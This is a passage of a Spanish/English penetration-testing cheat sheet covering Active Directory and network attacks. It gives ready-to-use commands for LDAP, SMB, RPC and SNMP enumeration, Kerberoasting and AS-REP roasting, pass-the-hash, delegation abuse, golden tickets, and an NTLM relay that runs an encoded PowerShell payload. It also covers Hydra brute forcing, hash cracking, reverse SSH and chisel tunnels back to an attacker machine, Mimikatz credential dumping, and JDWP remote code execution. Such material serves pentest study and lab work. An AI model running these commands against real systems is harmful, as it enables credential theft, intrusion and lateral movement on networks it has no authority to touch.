>>> connection=ldap3.Connection(server, 'SVC_TGS', 'GPPstillStandingStrong2k18') # Conexión usando credenciales
>>>  connection.bind()
# El servidor devolverá True o False indicando si la conexión se ha realizado correctamente o no.
>>> server.info
# El servidor devolverá info del dominio
# A continuación incluyo algunas búsquedas útiles.
# Todos los objetos del dominio
>>> connection.search('dc=DOMAIN,dc=DOMAIN', '(objectclass=*)')
>>> connection.entries # Para ver los resultados de la búsqueda
# Todos los objetos del dominio y susu atributos
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios AS_REProastables (no necesitan pre-autenticación de Kerberos) 
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios con servicios asociados (Para Kerberoasting)
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(servicePrincipalName=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de todos los atributos de un usuario
>>> connection.search(search_base='cn=users,dc=support,dc=htb',search_filter='(sAMAccountName=<username>)', search_scope='SUBTREE', attributes='*')
>>> connection.entries

```

[Back to top](#index)

## SMB Enumeration

```
# Info Con Enum4Linux
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>

# Obtener Usuarios
crackmapexec smb <IP_address> --users [-u <username> -p <password>]

# Enumerar grupos
crackmapexec smb <IP_address> --groups --loggedon-users [-u <username> -p <password>]

# Enumerar shares (varias opciones)
crackmapexec smb 10.10.10.10 --shares [-u <username> -p <password>]
smbclient --no-pass -L //<IP>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>

# Conectarse a una share (varias opciones)
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>/<Folder>
smbclient -U '%' -N \\\\<IP>\\<SHARE>
smbclient -U '<USER>' \\\\<IP>\\<SHARE>
# Si hay tuneles de por medio se puede especificar puerto
smbclient -p 4455 -L //<IP_ADDRESS>/ -U <USER> --password=<PASS>

# Montar una share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

# Descargar toda una share
smbclient //<IP>/<share>
mask ""
recurse
prompt
mget *

# Hacer spidering de una share buscando un patrón concreto ("." como patrón)
crackmapexec smb <ip_Addres> -u '' -p '' --spider <nombre_share> --pattern "."

# Realizar ataque Password Spraying
crackmapexec smb <ip_address> -u <users_file> -p <password> --continue-on-success

# Ejecutar comandos
crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoami

# Add a new share
NET USE f: \\SRVDC\Datos /PERSISTENT:YES /user:dom\Admin P@ssword

# Query a specific server to get available shares
net view \\hostname /all (-all flag is specified to list also the administrative shares, the ones with $ at the end)
```

[Back to top](#index)

## RPC Enumeration

```
# Conexión anónima (el resto de comandos son una vez se ha establecido la conexión)
rpcclient -U "" -N <IP_ADDRESS>

# Server Info
srvinfo

# Listar usuarios
querydispinfo
enumdomusers

# Info de un ususario
queryuser <0xrid>

# Grupos de un usuario
queryusergroups <0xrid>

# SID de un usuario
lookupnames <username>

# Alias de un usuario
queryuseraliases [builtin|domain] <sid>

# Listar grupos
enumdomgroups

# Información de un grupo
querygroup <0xrid>

# Miembros de un grupo
querygroupmem <0xrid>

# Listar alias de grupo
enumalsgroups <builtin|domain>

# Miembros del grupo por el alias
queryaliasmem builtin|domain <0xrid>

# Listar dominios
enumdomains

# SID del dominio
lsaquery

# Info del dominio
querydominfo

# Listar las shares
netshareenumall

# Info de una share
netsharegetinfo <share>

```

[Back to top](#index)

## SNMP Enumeration

|*Windows* MIB Values | Meaning|
|----------|-----------|
|1.3.6.1.2.1.25.1.6.0 |System Processes|
|1.3.6.1.2.1.25.4.2.1.2 |Running Programs|
|1.3.6.1.2.1.25.4.2.1.4 | Processes Path|
|1.3.6.1.2.1.25.2.3.1.4 | Storage Units|
|1.3.6.1.2.1.25.6.3.1.2 | Software Name|
|1.3.6.1.4.1.77.1.2.25 | User Accounts|
|1.3.6.1.2.1.6.13.1.3 | TCP Local Ports|

SNMP-Brute tool obtained from [here](https://github.com/SECFORCE/SNMP-Brute)
```
# Scan for Hosts with UDP Port 161 open
sudo nmap  -sU -p161 <ip_addr>

# Enumerate entire Management Information Base tree using Community String: public and timeout of 10 seconds
snmpwalk -c public -v1 -t 10 <ip_ADDR>

# Enumerate a specific Branch of the MIB Tree (in this case Running Programs, branch can be selected from table above)
snmpwalk -c public -v1 <IP_ADDR> 1.3.6.1.2.1.25.4.2.1.2

# Enumerate the entire MIB using known community string
snmpbulkwalk -c <community_string> -v<SNMP_Version> <IP> .

# Bruteforce community strings (even if target is using V3, try this)
python snmpbrute.py -t <target_ip>
```

[Back to top](#index)

## SMTP Enumeration

```
# Scan with nmap
nmap -p25 --script smtp-commands <IP_ADDR>
nmap -p25 --script smtp-open-relay <IP_ADDR> -v
nmap -p25 --script smtp-* <IP_ADDR>

# Connect
telnet <ip_addr> 25

# Salute
HELO falsedom.com

# Check if NTLM Auth is enabled
AUTH NTLM 334

# Check if user exists
VRFY root
EXPN root
```


[Back to top](#index)

## Kerberos attacks

Recomendado [Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/#Kerberoasting)

Recomendado [The Hacker Recipes - Kerberos - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

```
# Fuerza bruta a kerberos	
kerbrute -domain <domai> -users <user_file> -passwords <password_file> -outputfile <output_file>

# ASrepRoast	
impacket-GetNPUsers.py <dominio>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# Kerberoast	
impacket-GetUserSPNs jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast

# Overpass The Hash/Pass The Key (PTK)	
impacket-getTGT <domain</<username> -hashes :<hash_value>
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
impacket-psexec <dominio>/<user>@servicio.domain.htb -k -no-pass

# Pass the Hash	
impacket-psexec -hashes "<hashes>" <username>@domain
smbclient \\\\<ip_addr>\\<restricted_share_name> -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# Buscar Delegación	
impacket-findDelegation domain/username:password

# Añadir pc al dominio	
impacket-addcomputer domain/username -hashes <hash> -computer-name <algo> -computer-pass <otro_algo> -dc-host <dc_hostname>

# Solicitar Service Ticket y usarlo	(Constrained Delegation with Protocol Transition)
impacket-getST -spn "cifs/target" -impersonate "administrator" domain/user -hashes <hash> # Este comando guarda el ticket en administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass

# Solicitar Service Ticket y usarlo	(Constrained Delegation without Protocol Transition)
impacket-getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password" # Este comando guarda el ticket en administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass

#NTLM Relay Attack
sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <target_ip> -c "powershell -enc JABjAGwAaQ..."

```

[Back to top](#index)

## BruteForce (Hydra)

```
# Bruteforce SSH
sudo hydra -l george -P rockyou.txt ssh://<IP_ADDR> -s <PORT>

# Bruteforce RDP (password spraying)
hydra -L names.txt -p "SuperS3cure1337#" rdp://<IP_ADDR>

# Bruteforce FTP
hydra -L names.txt -P rockyou.txt ftp://<IP_ADDR>

# Bruteforce Web Login GET-FORM (In this example, credentials are sent Base64 encoded inside HTTP Header 'Authorization: Basic cXdlcjpxd2Vy')
hydra -l admin -P rockyou.txt -f 192.168.189.201 http-get /:A=BASIC

# Bruteforce Web Login POST-FORM (must extract POST login parameters from burpsuite and adjust the following command. Also must check the invalid login message and adjust the *:Login failed. Invalid* part inserting the actual error message given by the web app.
hydra -l user -P rockyou.txt <IP_ADDR> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

```

[Back to top](#index)

## Hascat, John and HashCracking related

```
# Hash detection using [Name-That-Hash](https://github.com/HashPals/Name-That-Hash)
nth -f hash_file --no-banner -a

# TGS cracking
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast

# AS_REP cracking
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

# NetNTLMv2 hash cracking
hashcat -m 5600 -a 0 -r rules/best64.rule hashes rockyou.txt

# NTLM hash cracking
hashcat -m 1000 -a 0 -r rules/best64.rule hashes rockyou.txt

# MD5 hash cracking
 hashcat.exe -m 0 --user -a 0 userPassHashes.txt rockyou.txt (--user flag may be omitted, it indicates that the hash file's format is  username:<md5 hash>)

# Wordpress,phpass, Joomla MD5 hash cracking
john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt

# Cracking ID_RSA hash to obtain passphrase
ssh2john id_rsa >id_rsa.hash
john id_rsa.hash -w=rockyou.txt
hashcat -m 22911 -a 0 id_rsa.hash rockyou.txt   # $sshng$0$
hashcat -m 22921 -a 0 id_rsa.hash rockyou.txt   # $sshng$6$
hashcat -m 22931 -a 0 id_rsa.hash rockyou.txt   # $sshng$1$
hashcat -m 22941 -a 0 id_rsa.hash rockyou.txt   # $sshng$4$
hashcat -m 22951 -a 0 id_rsa.hash rockyou.txt   # $sshng$5$

# Yescrypt hash cracking
john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt

# KeePass Password Manager MAster Password cracking from Database file
keepass2john database.kdbx # Dont foget to delete the initial *database:* string before trying to crack it
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force

# Extracting hashes from SAM and SYSTEM files With impacket-secretsdump
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

[Back to top](#index)

## Tunneling and Port Forwarding

### Using Socat

#### Local Port Forwarding

Listen on Port_X of Machine_A, and forward connections to Port_Y of Machine_B

On Machine_A execute:

`socat -ddd TCP-LISTEN:<Local_PORT_X>,fork TCP:<IP_Address_Machine_B>:<Remote_PORT_Y>` 

Flag *-ddd* is added for verbosity

#### Dynamic Port Forwarding

*TO DO*

#### Remote Port Forwarding

*TO DO*

[Back to top](#index)

### Using OpenSSH

#### Local Port Forwarding

Establish SSH connection/tunnel from Port_X of Machine_A to Port_Y of Machine_B and Forward to Port_Z of Machine_C.

Then from machine A (Kali) we will be able to access Port Z Machine C by connecting to Port X of Machine A.

On Machine_A execute:

`ssh -Nf -L 0.0.0.0:<PORT_X>:<IP_ADDR_Machine_C>:<PORT_Z> user@<IP_ADDR_Machine_B>`

#### Dynamic Port Forwarding

Forward all packets recevied at Port_X Machine_A through Machine_B. 

*-D* option of SSH creates a SOCKS proxy on the listening Port_X of Machine_A that sends the traffic through SSH tunnel to the Machine_B, allowing us to reach hosts on the subnets that Machine_B have access to.

On Machine_A execute:

`ssh -Nf -D 0.0.0.0:<PORT_X> <user>@<IP_ADDR_Machine_B>`

#### Remote Port Forwarding

In this case, we will connect from our Kali_Machine, through Machine_A, to Port_Y Machine_B. However, there is a Firewall between Kali_Machine and Machine_A that denys any inbound traffic and allows outbound traffic. As a result, we need to initiate an outbound connection from Machine_A to Kali_Machine. To do so, we will configure our Kali as SSH Server and Machine_A as SSH Client.

The trick is to initiate an outgoing ssh tunnel from Machine_A to Port_K of Kali_Machine. On Kali_Machine, packets will be received at Port_K and forwarded back through the ssh tunnel to Machine_A from where they can reach PORT_Y of Machine_B.

On Machine_A execute:

`ssh -Nf -R <localhost>:<PORT_K>:<IP_ADDR_Machine_B>:<PORT_Y> kali_user@<IP_ADDR_Kali_Machine>` 

Localhost refers to loopback interface on the SSH Server that is our Kali_Machine.

#### Remote Dynamic Port Forwarding

*For this to be possible Machine_A needs to have OpenSSH Version 7.6 (or higher)*

This case is a combination between Remote and Dynamic Port forwarding. We want to be able to connect from our Kali_Machine to any host on the subnets that Machine_A has access to. However, firewalls deny inbound traffic but allow outbound traffic.

Again, we will initiate an outgoing ssh tunnel from Machine_A to Port_K of Kali_Machine (that will act as SOCKS proxy), all traffic received on Port_K of Kali_Machine will be forwarded through the ssh tunnel to Machine_A from where they can reach any host of the subnets that Machine_A has access to.

On Machine_A, execute:

`ssh -Nf -R <PORT_K> kali_user@<IP_ADDR_Kali_Machine>`

[Back to top](#index)

### Using Chisel

#### Reverse SOCKS tunnel

On kali execute:

`./chisel server --port <PORT> --reverse`

On machine A execute:

`chisel client <kali_ip>:<PORT> R:socks`

[Back to top](#index)


## Mimikatz

### Sekurlsa

```
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
lsadump::dcsync /domain:pentestlab.local /all /csv
```

### Kerberos

```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### Crypto

```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export
```

### Vault&LSADump

```
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```
#### Dumping hashes lsadump

```
reg save HKLM\SAM SamWeb02Backup.hiv
reg save HKLM\SYSTEM SystemWeb02Backup.hiv
lsadump::sam SystemWeb02Backup.hiv SamWeb02Backup.hiv
```

[Back to top](#index)

## JDWP Rce

```
# Using jdwp-shellifier.py
python3 jdwp-shellifier.py #by default it targets 0.0.0.0 on port 8000
python3 jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'whatever_command'

# Manuallly, it doesn't alwas works this way.
jdb -attach 8000
trace go methods
stop in java.lang.String().indexOf(int)
print new java.lang.String("Blah").length() # this should give us --> new java.lang.String("Blah").length() = 4
print new java.lang.Runtime().exec("<cmd>") # executes the command.
```

[Back to top](#index)

